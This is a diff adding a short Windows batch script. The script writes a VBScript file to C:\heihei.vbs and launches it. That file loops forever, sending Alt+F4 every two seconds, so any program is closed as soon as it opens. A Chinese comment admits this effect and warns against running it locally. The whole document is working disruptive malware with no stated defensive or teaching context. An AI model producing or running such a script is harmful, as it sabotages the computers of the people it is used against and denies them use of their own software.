@@ -1,0 +1,14 @@
+9
+del /f /q "C:\heihei.vbs"
+echo Dim^ ws >>C:/heihei.vbs
+echo set^ ws^=CreateObject^ ^(^"WSCript^.shell^"^) >>C:/heihei.vbs
+echo do >>C:/heihei.vbs
+echo wscript^.sleep^ 2000 >>C:/heihei.vbs
+echo ws^.SendKeys^ ^"^%^{F4^}^" >>C:/heihei.vbs
+echo loop >>C:/heihei.vbs
+start c:/heihei.vbs
+exit
+
+
+
+//此脚本会导致打不开软件（打开就关掉） 本机慎用
